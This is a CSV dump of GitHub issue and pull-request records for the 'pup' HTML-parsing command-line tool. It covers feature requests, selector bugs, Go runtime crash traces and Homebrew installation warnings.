ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/92,277700342,MDU6SXNzdWUyNzc3MDAzNDI=,92,wildcard,14801148,closed,FALSE,NA,NA,0,2017-11-29T10:23:54Z,2017-12-14T08:42:10Z,2017-12-14T08:42:10Z,NONE,NA,"Is it possible to add wildcard to pup?
For example I would like to find attribute `*price*` or class `*price*`.

matches all classes with text 'price'
`curl -s ""$link"" | pup "".*price* text{} ""`
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/92/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/92/comments,https://api.github.com/repos/ericchiang/pup/issues/92/events,https://github.com/ericchiang/pup/issues/92,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/91,274330740,MDU6SXNzdWUyNzQzMzA3NDA=,91,Multiple classes in an element,8478946,open,FALSE,NA,NA,0,2017-11-15T22:40:44Z,2017-11-15T22:41:40Z,NA,NONE,NA,"## input:
```
<div class=""c1"">
 content 1
</div>
<div class=""c1 c2"">
 content 2
</div>
```
## pup command
 `cat test.html | pup "".c1.c2""`

## Expected output:
```
<div class=""c1 c2"">
 content 2
</div>
```

## Actual output:
```
<div class=""c1"">
 content 1
</div>
<div class=""c1 c2"">
 content 2
</div>
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/91/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/91/comments,https://api.github.com/repos/ericchiang/pup/issues/91/events,https://github.com/ericchiang/pup/issues/91,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/90,271916803,MDU6SXNzdWUyNzE5MTY4MDM=,90,Empty Tags in text{} output,131297,open,FALSE,NA,NA,2,2017-11-07T17:25:45Z,2020-03-12T08:39:14Z,NA,NONE,NA,"Outputting as text is useful for converting to CSV or similar. In that scenario it useful to always have the same number of elements (columns in the CSV) returned.

e.g., for the following:

```
  <p>some text</p>
  <p>more text</p>
```

`pup 'p text{}'` will return 2 lines:

```
some text
more text
```

whereas 

```
  <p>some text</p>
  <p></p> <!-- empty tag -->
```

returns

```
some text
```

but would ideally return

```
some text

```

Note blank line returned for the empty text of the empty p node.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/90/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/90/comments,https://api.github.com/repos/ericchiang/pup/issues/90/events,https://github.com/ericchiang/pup/issues/90,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/89,271898330,MDU6SXNzdWUyNzE4OTgzMzA=,89,Intermittent fatal happening on MacOS 10.12.6.,131297,closed,FALSE,NA,NA,1,2017-11-07T16:33:12Z,2017-11-08T09:59:32Z,2017-11-08T09:59:32Z,NONE,NA,"Intermittent fatal happening on MacOS 10.12.6.

Same files and selectors fail intermittently with this fault:

```
fatal error: unexpected signal during runtime execution
[signal 0xb code=0x1 addr=0xb01dfacedebac1e pc=0x1d83b]

runtime stack:
runtime.throw(0x246e20, 0x2a)
	/usr/local/go/src/runtime/panic.go:547 +0x90
runtime.sigpanic()
	/usr/local/go/src/runtime/sigpanic_unix.go:12 +0x5a
runtime.unlock(0x3ca600)
	/usr/local/go/src/runtime/lock_sema.go:107 +0x14b
runtime.(*mheap).alloc_m(0x3ca600, 0x1, 0x5, 0x434c98)
	/usr/local/go/src/runtime/mheap.go:492 +0x314
runtime.(*mheap).alloc.func1()
	/usr/local/go/src/runtime/mheap.go:502 +0x41
runtime.systemstack(0x7fff5fbff8f8)
	/usr/local/go/src/runtime/asm_amd64.s:307 +0xab
runtime.(*mheap).alloc(0x3ca600, 0x1, 0x10000000005, 0x1d4df)
	/usr/local/go/src/runtime/mheap.go:503 +0x63
runtime.(*mcentral).grow(0x3cbb00, 0x0)
	/usr/local/go/src/runtime/mcentral.go:209 +0x93
runtime.(*mcentral).cacheSpan(0x3cbb00, 0xc8200186f8)
	/usr/local/go/src/runtime/mcentral.go:89 +0x47d
runtime.(*mcache).refill(0x42f4b0, 0x5, 0xc820033cf8)
	/usr/local/go/src/runtime/mcache.go:119 +0xcc
runtime.mallocgc.func2()
	/usr/local/go/src/runtime/malloc.go:642 +0x2b
runtime.systemstack(0x3c7200)
	/usr/local/go/src/runtime/asm_amd64.s:291 +0x79
runtime.mstart()
	/usr/local/go/src/runtime/proc.go:1051

goroutine 1 [running, locked to thread]:
runtime.systemstack_switch()
	/usr/local/go/src/runtime/asm_amd64.s:245 fp=0xc820033c88 sp=0xc820033c80
runtime.mallocgc(0x40, 0x1cce60, 0x1, 0x3)
	/usr/local/go/src/runtime/malloc.go:643 +0x869 fp=0xc820033d60 sp=0xc820033c88
runtime.newarray(0x1cce60, 0x1, 0x47b6a5baee7662f1)
	/usr/local/go/src/runtime/malloc.go:798 +0xc9 fp=0xc820033da0 sp=0xc820033d60
runtime.mapassign1(0x178180, 0xc82008a270, 0x26e840, 0x26e844)
	/usr/local/go/src/runtime/hashmap.go:453 +0x134 fp=0xc820033e48 sp=0xc820033da0
github.com/ericchiang/pup/vendor/golang.org/x/text/language.init()
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/text/language/index.go:759 +0x14d fp=0xc820033ea8 sp=0xc820033e48
github.com/ericchiang/pup/vendor/golang.org/x/text/encoding/htmlindex.init()
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/text/encoding/htmlindex/tables.go:352 +0x56 fp=0xc820033ee0 sp=0xc820033ea8
github.com/ericchiang/pup/vendor/golang.org/x/net/html/charset.init()
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/charset/charset.go:257 +0x63 fp=0xc820033ee8 sp=0xc820033ee0
main.init()
	/go/src/github.com/ericchiang/pup/selector.go:638 +0x79 fp=0xc820033f50 sp=0xc820033ee8
runtime.main()
	/usr/local/go/src/runtime/proc.go:177 +0x27f fp=0xc820033fa0 sp=0xc820033f50
runtime.goexit()
	/usr/local/go/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc820033fa8 sp=0xc820033fa0
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/89/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/89/comments,https://api.github.com/repos/ericchiang/pup/issues/89/events,https://github.com/ericchiang/pup/issues/89,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/88,265590483,MDExOlB1bGxSZXF1ZXN0MTQ2NjYwODc4,88,Additional installation method,32581276,closed,FALSE,NA,NA,0,2017-10-15T17:57:43Z,2018-10-27T14:36:48Z,2018-10-27T14:36:45Z,NONE,NA,Added method utilizing Nix package manager,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/88/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/88/comments,https://api.github.com/repos/ericchiang/pup/issues/88/events,https://github.com/ericchiang/pup/pull/88,https://api.github.com/repos/ericchiang/pup/pulls/88
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/87,265527707,MDU6SXNzdWUyNjU1Mjc3MDc=,87,support for :checked pseudoclass,155179,open,FALSE,NA,NA,0,2017-10-14T22:10:24Z,2017-10-14T22:10:24Z,NA,NONE,NA,"I'm currently unable to use pup on a particular project because I need to grab the selected `<option>` element within a `<select>` input, but there's currently no support for the `:checked` pseudoclass.

https://developer.mozilla.org/en-US/docs/Web/CSS/:checked",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/87/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/87/comments,https://api.github.com/repos/ericchiang/pup/issues/87/events,https://github.com/ericchiang/pup/issues/87,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/86,264208582,MDU6SXNzdWUyNjQyMDg1ODI=,86,Parse command line flags,5055,open,FALSE,NA,NA,0,2017-10-10T12:27:31Z,2017-10-10T12:27:31Z,NA,NONE,NA,Just curious .. why don't you use flag package from Go standard library to parse command line flags in parse.go?,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/86/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/86/comments,https://api.github.com/repos/ericchiang/pup/issues/86/events,https://github.com/ericchiang/pup/issues/86,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/85,263038990,MDU6SXNzdWUyNjMwMzg5OTA=,85,Segmentation fault 11 on Mac High Sierra,21059,open,FALSE,NA,NA,5,2017-10-05T08:15:11Z,2018-11-15T21:51:56Z,NA,NONE,NA,"I ran:

    brew install https://raw.githubusercontent.com/EricChiang/pup/master/pup.rb

Then

    $ pup
    Segmentation fault: 11

Just installed Mac OS X High Sierra 10.13 (17A365)

What more info do you need?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/85/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/85/comments,https://api.github.com/repos/ericchiang/pup/issues/85/events,https://github.com/ericchiang/pup/issues/85,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/84,260369382,MDU6SXNzdWUyNjAzNjkzODI=,84,Formatted output introduces unwanted whitespace into text,32275753,open,FALSE,NA,NA,0,2017-09-25T18:19:52Z,2017-09-25T18:19:52Z,NA,NONE,NA,"When using pup to extract bigger blocks of stuff, like a normal div containing text and p-tags and the usual things, the underlying html may contain stuff like:
`   <p>“<span style=""font-size: medium;"">I try,” I grunted. “You got my winnings?”</span></p>`
The problem here is that pup's default (and only) formatting will put all tags in logical blocks which leads to:
 ```  
   <p>
   “
   <span style=""font-size: medium;"">
   I try,"" I grunted. “You got my winnings?""
   </span>
   </p>
```

This adds a space after the opening quote:

>  “ I try,” I grunted. “You got my winnings?” 

I've been using pup to extract blocks of prose text from blogs to make quick epub files, which is probably not the intended target use for the project. It's been a great help (would love the ability to inverse filter away stuff), and this issue is mainly because of wonky / malformed formatting in the original source, so thanks for a great little project!",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/84/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/84/comments,https://api.github.com/repos/ericchiang/pup/issues/84/events,https://github.com/ericchiang/pup/issues/84,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/83,258247986,MDU6SXNzdWUyNTgyNDc5ODY=,83,Cannot get <textarea> text{},5085485,closed,FALSE,NA,NA,2,2017-09-16T17:59:44Z,2018-03-03T02:11:44Z,2018-03-03T02:11:44Z,NONE,NA,"Hi, I'd like to get the 
```
class Solution {
public:
    int maxArea(vector<int>& height) {
        
    }
};
```
from
https://leetcode.com/problems/container-with-most-water/description/  .

I did `curl https://leetcode.com/problems/container-with-most-water/description/ | pup 'textarea text{}'` but it doesn't work.

",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/83/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/83/comments,https://api.github.com/repos/ericchiang/pup/issues/83/events,https://github.com/ericchiang/pup/issues/83,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/81,253114161,MDExOlB1bGxSZXF1ZXN0MTM3ODA3NDY4,81,Implement --invert to remove tags matching selector.,2261204,open,FALSE,NA,NA,8,2017-08-26T18:27:59Z,2019-11-05T15:47:40Z,NA,NONE,NA,"Fixes #74. I've never written any Go before, so I'd appreciate a code review. Marked WIP because of that and also because I want to add tests but haven't looked at the test harness hard enough to figure out how yet.",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/81/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/81/comments,https://api.github.com/repos/ericchiang/pup/issues/81/events,https://github.com/ericchiang/pup/pull/81,https://api.github.com/repos/ericchiang/pup/pulls/81
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/80,253113566,MDU6SXNzdWUyNTMxMTM1NjY=,80,Tests for json{} are failing,2261204,open,FALSE,NA,NA,1,2017-08-26T18:17:02Z,2017-11-28T12:18:16Z,NA,NONE,NA,"When I run `tests/test` I get:
```
13c13
< ecb542a30fc75c71a0c6380692cbbc4266ccbce4 json{}
---
> 199188dc8f1522426a628e41d96264bffb8beb0f json{}
37c37
< 97d170e1550eee4afc0af065b78cda302a97674c #toc li + a json{}
---
> cd0d4cc32346750408f7d4f5e78ec9a6e5b79a0d #toc li + a json{}
```

I tried bisecting, but I can't compile anything between 0b21bd0bc8e08c515e3b739885c08b94a97ea4dc (the last good commit) and fb09a23cce6c8ed60ba9b85035e3e27adff96aa3 (the first bad commit), due to some sort of dependency problem that I can't figure out (I've never used go before). My suspicion is that the culprit is probably 6d1318bfa484b60309fe7a13e036093c179f15d6, since that commit changes the way `json{}` is displayed, but doesn't update the tests.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/80/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/80/comments,https://api.github.com/repos/ericchiang/pup/issues/80/events,https://github.com/ericchiang/pup/issues/80,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/79,250473721,MDU6SXNzdWUyNTA0NzM3MjE=,79,Not usable on windows (cmd.exe),8239937,open,FALSE,NA,NA,2,2017-08-16T00:17:19Z,2020-10-08T22:09:01Z,NA,NONE,NA,"I really like the simple design of this tool and thought using it would be straight forward.
But I tried several kind of selectors, but with almost no success.

OK, I only tried with one html file so far, but at least _pup_ has formated/pretty-printed it correctly, so parsing should work fine, I guess.

As mentioned in [Issue 54](https://github.com/ericchiang/pup/issues/54) single quotes mostly do not work on windows.
I could only filter out something with simple tag selectors using double quotes (e.g. ""meta"", ""head"").
**Most of the times it does not output anything!**

`Selector parsing error: Malformed 'contains("""")' selector`
Using **:contains("""")**  always throws an error, no matter how I try to use it.
The source code [(selector.go)](https://github.com/ericchiang/pup/blob/master/selector.go) seems to do this on (for the user) various non-distinguishable cases.

Does anyone use this tool on windows? Is there a trick or does it just not work properly?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/79/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/79/comments,https://api.github.com/repos/ericchiang/pup/issues/79/events,https://github.com/ericchiang/pup/issues/79,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/78,241448596,MDU6SXNzdWUyNDE0NDg1OTY=,78,"Feature idea: Add ""--exec"" to allow for looping through results",3296828,open,FALSE,NA,NA,1,2017-07-08T12:53:02Z,2017-07-09T05:37:34Z,NA,NONE,NA,"I wanted to use pup to mass download some files from a site, and it did a very good job of parsing the HTML. But then I had to pipe the results into a bash loop – it would be nice to have this built in with an `--exec` type flag, in a similar vein to how the `find` command works. Could have a different name, that's just my initial suggestion.

So, instead of this implementation:

`curl http://www.mysite.com | pup 'a attr{href}' | while read i; do wget $i; done`

You could have:

`curl http://www.mysite.com | pup 'a attr{href}' --exec wget {} \;`

Does that sound like a valid idea?
Thanks!",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/78/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/78/comments,https://api.github.com/repos/ericchiang/pup/issues/78/events,https://github.com/ericchiang/pup/issues/78,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/77,228534789,MDU6SXNzdWUyMjg1MzQ3ODk=,77,How to group output of multiple selectors?,3388897,closed,FALSE,NA,NA,4,2017-05-14T11:15:56Z,2021-04-14T20:53:05Z,2021-04-14T20:53:05Z,NONE,NA,"Given some html like this:
```html
<ul>
  <li>
    <h2>1</h2>
    <div>
      <span class=""description"">one</span>
    </div>
  </li>
  <li>
    <h2>2</h2>
    <div>
      <span class=""description"">two</span>
    </div>
  </li>
</ul>
```

I'd like to extract the contents of `h2` and `.description` for each list item. I've tried

`pup 'li h2, li .description'`

which produces

```html
<h2>
 1
</h2>
<h2>
 2
</h2>
<span class=""description"">
 one
</span>
<span class=""description"">
 two
</span>
```

However, what I'm after is more of a depth-first grouping of the matching selectors, e.g.:

```html
<h2>
 1
</h2>
<span class=""description"">
 one
</span>

<h2>
 2
</h2>
<span class=""description"">
 two
</span>
```

Is this possible? ",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/77/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/77/comments,https://api.github.com/repos/ericchiang/pup/issues/77/events,https://github.com/ericchiang/pup/issues/77,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/76,228421170,MDU6SXNzdWUyMjg0MjExNzA=,76,fatal error parsing large file,72790,closed,FALSE,NA,NA,3,2017-05-12T22:17:20Z,2017-05-16T17:09:49Z,2017-05-16T17:09:49Z,NONE,NA,"```
→ pup --version
0.4.0
```

I am frequently getting the following error trying to parse large HTML files (this one is 71M):

```
→ cat data.txt | pup '.entry-content p'
fatal error: unexpected signal during runtime execution
[signal 0xb code=0x1 addr=0xb01dfacedebac1e pc=0x1d83b]

runtime stack:
runtime.throw(0x246e20, 0x2a)
	/usr/local/go/src/runtime/panic.go:547 +0x90
runtime.sigpanic()
	/usr/local/go/src/runtime/sigpanic_unix.go:12 +0x5a
runtime.unlock(0x3ca600)
	/usr/local/go/src/runtime/lock_sema.go:107 +0x14b
runtime.(*mheap).alloc_m(0x3ca600, 0x1, 0x15, 0x9b0590)
	/usr/local/go/src/runtime/mheap.go:492 +0x314
runtime.(*mheap).alloc.func1()
	/usr/local/go/src/runtime/mheap.go:502 +0x41
runtime.systemstack(0xc820043e58)
	/usr/local/go/src/runtime/asm_amd64.s:307 +0xab
runtime.(*mheap).alloc(0x3ca600, 0x1, 0x10000000015, 0x1d4df)
	/usr/local/go/src/runtime/mheap.go:503 +0x63
runtime.(*mcentral).grow(0x3cc200, 0x0)
	/usr/local/go/src/runtime/mcentral.go:209 +0x93
runtime.(*mcentral).cacheSpan(0x3cc200, 0x9b0590)
	/usr/local/go/src/runtime/mcentral.go:89 +0x47d
runtime.(*mcache).refill(0x42f000, 0xc800000015, 0x9b0590)
	/usr/local/go/src/runtime/mcache.go:119 +0xcc
runtime.mallocgc.func2()
	/usr/local/go/src/runtime/malloc.go:642 +0x2b
runtime.systemstack(0xc820020000)
	/usr/local/go/src/runtime/asm_amd64.s:291 +0x79
runtime.mstart()
	/usr/local/go/src/runtime/proc.go:1051

goroutine 1 [running]:
runtime.systemstack_switch()
	/usr/local/go/src/runtime/asm_amd64.s:245 fp=0xc82049d8c0 sp=0xc82049d8b8
runtime.mallocgc(0x180, 0x1caa60, 0x0, 0xc8277ef1f8)
	/usr/local/go/src/runtime/malloc.go:643 +0x869 fp=0xc82049d998 sp=0xc82049d8c0
runtime.newarray(0x1caa60, 0x8, 0xc8277ef1f8)
	/usr/local/go/src/runtime/malloc.go:798 +0xc9 fp=0xc82049d9d8 sp=0xc82049d998
runtime.growslice(0x16b5a0, 0xc825afb140, 0x4, 0x4, 0x5, 0x0, 0x0, 0x0)
	/usr/local/go/src/runtime/slice.go:100 +0x2c1 fp=0xc82049da48 sp=0xc82049d9d8
github.com/ericchiang/pup/vendor/golang.org/x/net/html.(*Tokenizer).Token(0xc820063380, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/token.go:1176 +0x4b1 fp=0xc82049db68 sp=0xc82049da48
github.com/ericchiang/pup/vendor/golang.org/x/net/html.(*parser).parse(0xc8200b1ad0, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/parse.go:2002 +0xe6 fp=0xc82049dc10 sp=0xc82049db68
github.com/ericchiang/pup/vendor/golang.org/x/net/html.Parse(0x4837d0, 0xc8200ee000, 0x0, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/parse.go:2026 +0x127 fp=0xc82049dc48 sp=0xc82049dc10
main.ParseHTML(0x4837d0, 0xc8200ee000, 0x0, 0x0, 0xc820034008, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/parse.go:43 +0xdf fp=0xc82049dd28 sp=0xc82049dc48
main.main()
	/go/src/github.com/ericchiang/pup/pup.go:30 +0x229 fp=0xc82049df50 sp=0xc82049dd28
runtime.main()
	/usr/local/go/src/runtime/proc.go:188 +0x2b0 fp=0xc82049dfa0 sp=0xc82049df50
runtime.goexit()
	/usr/local/go/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82049dfa8 sp=0xc82049dfa0
```

While I don't know Go, it looks like a malloc error. This system has 6GB of free memory out of 16GB.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/76/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/76/comments,https://api.github.com/repos/ericchiang/pup/issues/76/events,https://github.com/ericchiang/pup/issues/76,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/75,222297156,MDExOlB1bGxSZXF1ZXN0MTE2MjQ4NDg4,75,Fix broken headings in Markdown files,3905501,closed,FALSE,NA,NA,0,2017-04-18T04:18:15Z,2017-09-16T13:54:00Z,2017-04-18T04:47:21Z,CONTRIBUTOR,NA,"GitHub changed the way Markdown headings are parsed, so this change fixes it.

See [bryant1410/readmesfix](https://github.com/bryant1410/readmesfix) for more information.

Tackles bryant1410/readmesfix#1
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/75/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/75/comments,https://api.github.com/repos/ericchiang/pup/issues/75/events,https://github.com/ericchiang/pup/pull/75,https://api.github.com/repos/ericchiang/pup/pulls/75
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/74,221689002,MDU6SXNzdWUyMjE2ODkwMDI=,74,Feature Request: strip tags that match a selector,829836,open,FALSE,NA,NA,3,2017-04-13T21:36:40Z,2019-09-27T15:32:41Z,NA,NONE,NA,"Similar to grep's -v (inverse grep), I'd love an 'inverse select' option for pup. Something like:

```
$ echo '<div><h1>Yes</h1><p>No</p></div>' | pup -v 'p'
<div><h1>Yes</h1></div>
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/74/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/74/comments,https://api.github.com/repos/ericchiang/pup/issues/74/events,https://github.com/ericchiang/pup/issues/74,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/73,218659074,MDExOlB1bGxSZXF1ZXN0MTEzNzU4MzEx,73,Update: new hardware class,5769156,closed,FALSE,NA,NA,1,2017-04-01T02:05:25Z,2017-04-01T20:09:52Z,2017-04-01T20:09:52Z,CONTRIBUTOR,NA,"Should fix the deprecated message for Homebrew

Issue: #72 ",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/73/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/73/comments,https://api.github.com/repos/ericchiang/pup/issues/73/events,https://github.com/ericchiang/pup/pull/73,https://api.github.com/repos/ericchiang/pup/pulls/73
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/72,203629284,MDU6SXNzdWUyMDM2MjkyODQ=,72,homebrew deprecated message,1357701,closed,FALSE,NA,NA,1,2017-01-27T12:57:26Z,2017-04-02T23:27:01Z,2017-04-02T23:27:01Z,NONE,NA,"I'm getting a deprecated message

```.%> brew install https://raw.githubusercontent.com/EricChiang/pup/master/pup.rb
######################################################################## 100.0%
Warning: Calling Hardware.is_64_bit? is deprecated!
Use Hardware::CPU.is_64_bit? instead.
/.../homebrew/Formula/pup.rb:7:in `<class:Pup>'

Warning: Calling Hardware.is_64_bit? is deprecated!
Use Hardware::CPU.is_64_bit? instead.
/../homebrew/Formula/pup.rb:7:in `<class:Pup>'
```

Can you update?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/72/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/72/comments,https://api.github.com/repos/ericchiang/pup/issues/72/events,https://github.com/ericchiang/pup/issues/72,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/71,197560886,MDU6SXNzdWUxOTc1NjA4ODY=,71,Consider adding feature to strip text?,7613160,open,FALSE,NA,NA,1,2016-12-26T08:59:21Z,2017-01-07T23:35:10Z,NA,NONE,NA,Sometimes content text will contain special characters such as `&nbsp;`,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/71/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/71/comments,https://api.github.com/repos/ericchiang/pup/issues/71/events,https://github.com/ericchiang/pup/issues/71,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/70,174635885,MDExOlB1bGxSZXF1ZXN0ODM3MTQyNjY=,70,Update deprecated hardware check,1007647,closed,FALSE,NA,NA,3,2016-09-01T21:57:48Z,2016-10-12T03:57:02Z,2016-10-12T03:57:02Z,CONTRIBUTOR,NA,"```
Warning: Calling Hardware.is_64_bit? is deprecated!
Use Hardware::CPU.is_64_bit? instead.
/Users/pair/Library/Caches/Homebrew/Formula/pup.rb:7:in `<class:Pup>'
```
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/70/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/70/comments,https://api.github.com/repos/ericchiang/pup/issues/70/events,https://github.com/ericchiang/pup/pull/70,https://api.github.com/repos/ericchiang/pup/pulls/70
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/69,174635657,MDExOlB1bGxSZXF1ZXN0ODM3MTQwODc=,69,Update deprecated hardware check,1007647,closed,FALSE,NA,NA,0,2016-09-01T21:56:29Z,2016-09-01T21:58:13Z,2016-09-01T21:58:13Z,CONTRIBUTOR,NA,"``` plain
Warning: Calling Hardware.is_64_bit? is deprecated!
Use Hardware::CPU.is_64_bit? instead.
/Users/pair/Library/Caches/Homebrew/Formula/pup.rb:7:in `<class:Pup>'
```
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/69/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/69/comments,https://api.github.com/repos/ericchiang/pup/issues/69/events,https://github.com/ericchiang/pup/pull/69,https://api.github.com/repos/ericchiang/pup/pulls/69
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/68,172175295,MDExOlB1bGxSZXF1ZXN0ODIwMTI1Mzc=,68,Fix typos,141546,closed,FALSE,NA,NA,1,2016-08-19T16:58:13Z,2016-08-19T17:09:31Z,2016-08-19T17:09:31Z,CONTRIBUTOR,NA,"Found using [mwic](http://jwilk.net/software/mwic).
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/68/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/68/comments,https://api.github.com/repos/ericchiang/pup/issues/68/events,https://github.com/ericchiang/pup/pull/68,https://api.github.com/repos/ericchiang/pup/pulls/68
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/67,167099102,MDU6SXNzdWUxNjcwOTkxMDI=,67,Switch Homebrew formular to use SHA256 checksum,133924,closed,FALSE,NA,NA,4,2016-07-22T17:58:04Z,2016-07-25T14:38:26Z,2016-07-25T14:38:26Z,NONE,NA,"As seen below, SHA1 support is deprecated.

``` bash
$ brew install https://raw.githubusercontent.com/EricChiang/pup/master/pup.rb
######################################################################## 100.0%
==> Downloading https://github.com/EricChiang/pup/releases/download/v0.3.9/pup_darwin_amd64.zip
==> Downloading from https://github-cloud.s3.amazonaws.com/releases/23527160/4e41671c-dba8-11e4-8d51-6273e4e896c1.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAISTNZFOVBIJMK3TQ%2F20160722%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20160722T175309Z&X-Amz-Expires=300&X-Amz-Signature=8ddae53116fbbbb826dcf98db5c7ac49ca1fec2be86b7604be174e14b1f532d3&X-Amz
######################################################################## 100.0%
Warning: SHA1 support is deprecated and will be removed in a future version.
Please switch this formula to SHA256.
🍺  /usr/local/Cellar/pup/0.3.9: 2 files, 4.4M, built in 3 seconds
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/67/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/67/comments,https://api.github.com/repos/ericchiang/pup/issues/67/events,https://github.com/ericchiang/pup/issues/67,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/66,161823397,MDU6SXNzdWUxNjE4MjMzOTc=,66,`import cycle not allowed` when install from Go,1461437,closed,FALSE,NA,NA,2,2016-06-23T01:48:20Z,2016-06-23T05:15:31Z,2016-06-23T05:15:31Z,NONE,NA,"I haven't used Go lang before. So after installed to a custom location in Linux, and export `GOROOT` as well as `GOPATH` with my custom path, I got a `import cycle not allowed` error for `go get github.com/ericchiang/pup`, details as follow:

```
import cycle not allowed
package github.com/ericchiang/pup
        imports bytes
        imports errors
        imports runtime
        imports runtime/internal/atomic
        imports unsafe
        imports runtime
```

searched but still can't figure out what's the problem.. Anyone helps?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/66/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/66/comments,https://api.github.com/repos/ericchiang/pup/issues/66/events,https://github.com/ericchiang/pup/issues/66,NA
